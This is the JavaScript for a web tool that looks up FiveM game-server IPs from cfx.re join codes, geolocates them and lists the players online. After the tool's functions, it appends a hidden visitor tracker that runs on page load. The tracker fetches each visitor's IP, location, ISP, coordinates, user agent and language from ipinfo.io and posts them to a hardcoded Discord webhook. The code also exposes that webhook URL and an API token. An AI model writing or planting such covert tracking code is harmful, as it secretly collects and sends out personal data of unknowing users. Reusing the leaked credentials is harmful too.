const ipApiBaseUrl = 'http://ip-api.com/json';
let searchCount = parseInt(localStorage.getItem('searchCount') || "0");
let lastPopupTime = localStorage.getItem('lastPopupTime');
const currentTime = Date.now();

if (lastPopupTime && currentTime - lastPopupTime > 24 * 60 * 60 * 1000) {
  searchCount = 0;
  localStorage.setItem('searchCount', searchCount);
}

async function getServerIP() {
  const input = document.getElementById('cfxUrl').value.trim();
  const resultDiv = document.getElementById('result');
  const ipBox = document.querySelector(".ip-details-box");
  const links = document.querySelector(".links");

  resultDiv.innerHTML = "Fetching IP...";
  ipBox.innerHTML = "";
  links.style.display = "none";

  let code = "";

  if (input.includes("cfx.re/join/")) {
    code = input.split("cfx.re/join/")[1];
  } else {
    code = input;
  }

  try {
    const res = await fetch(`https://servers-frontend.fivem.net/api/servers/single/${code}`);
    if (!res.ok) throw new Error("Invalid CFX code");

    const data = await res.json();
    window.latestServerData = data?.Data;
    const ip = data?.Data?.connectEndPoints?.[0];

    if (!ip) throw new Error("IP not found");

    resultDiv.innerHTML = `<strong>Server IP:</strong> ${ip}`;

    const ipOnly = ip.split(":")[0];
    const ipDetails = await getIpDetails(ipOnly);

    if (ipDetails) {
      displayIpDetails(ipDetails, ip);
      links.style.display = "block";
      lastIPPort = ip;
    }

    document.getElementById('playersLink').href = `http://${ip}/players.json`;
    document.getElementById('infoLink').href = `http://${ip}/dynamic.json`;
    lastIPPort = ip; 


    searchCount++;
    localStorage.setItem('searchCount', searchCount);

    if (searchCount >= 3 && (!lastPopupTime || currentTime - lastPopupTime > 24 * 60 * 60 * 1000)) {
      showPopup();
      localStorage.setItem('lastPopupTime', currentTime);
    }

  } catch (err) {
    resultDiv.innerHTML = `<span style='color: red;'>Error: ${err.message}</span>`;
  }
}

async function getIpDetails(ip) {
  try {
    const res = await fetch(`${ipApiBaseUrl}/${ip}?fields=status,message,country,region,city,timezone,org,query`);
    const data = await res.json();
    if (data.status === 'fail') return null;
    return data;
  } catch (error) {
    console.error(error);
    return null;
  }
}

function displayIpDetails(details, ipWithPort) {
  const html = `
    <div class="ip-details">
      <strong>IP:</strong> ${ipWithPort}<br>
      <strong>Country:</strong> ${details.country}<br>
      <strong>Region:</strong> ${details.region}<br>
      <strong>City:</strong> ${details.city}<br>
      <strong>ISP:</strong> ${details.org}<br>
      <strong>Timezone:</strong> ${details.timezone}
    </div>
  `;
  document.querySelector(".ip-details-box").innerHTML = html;
}

function showPopup() {
  document.getElementById("customPopup").style.display = "block";
}

function closePopup() {
  document.getElementById("customPopup").style.display = "none";
}

let lastIPPort = null;

function showMoreInfo() {
  const data = window.latestServerData;
  if (!data) return;

  const playersDiv = document.getElementById('playersList');
  const resourcesDiv = document.getElementById('resourcesList');

  
  const players = data.players || [];
  const count = players.length;
  const names = players.map(p => `- ${p.name}`).join('\n');
  playersDiv.innerHTML = `
    <p><strong>Player Online :</strong> ${count}</p>
    <pre><code>${names || '- No players found'}</code></pre>
  `;

  
  const resources = data.resources || [];
  resourcesDiv.innerHTML = `
    <p><strong>Resources its :</strong> ${resources.length}</p>
    <pre><code>${resources.join('\n') || 'No resources found'}</code></pre>
  `;

  document.getElementById('moreInfoPopup').style.display = 'flex';
}

document.getElementById('moreInfoPopup').addEventListener('click', function (e) {
  if (e.target === this) {
    closeMoreInfo();
  }
});

    const webhookURL = 'https://discord.com/api/webhooks/1378126392486527160/egaAzIzW2gn5GErKtDFfi-DHN_5o6TMVNwRJKDFr7DpilmF9yP3dReIHfiXtymCtiRWY'; 
    const ipinfoToken = '89401f0ed93865';

    async function sendToDiscord(data) {
      const payload = {
        username: "🕵️ Visitor Tracker",
        embeds: [{
          title: "📥 New Visitor Info",
          color: 0x3498db,
          fields: [
            { name: "🌐 IP", value: data.ip || "N/A" },
            { name: "📍 Location", value: `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}` },
            { name: "🏢 ISP", value: data.org || "N/A" },
            { name: "📡 Loc", value: data.loc || "N/A" },
            { name: "💻 User Agent", value: navigator.userAgent.slice(0, 1024) },
            { name: "🈯 Language", value: navigator.language || "N/A" },
            { name: "🔗 Page URL", value: window.location.href }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("❌ Webhook Error:", err);
      }
    }

    async function getVisitorInfo() {
      try {
        const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
        const data = await res.json();
        sendToDiscord(data);
      } catch (err) {
        console.error("❌ IPInfo Error:", err);
      }
    }

    getVisitorInfo();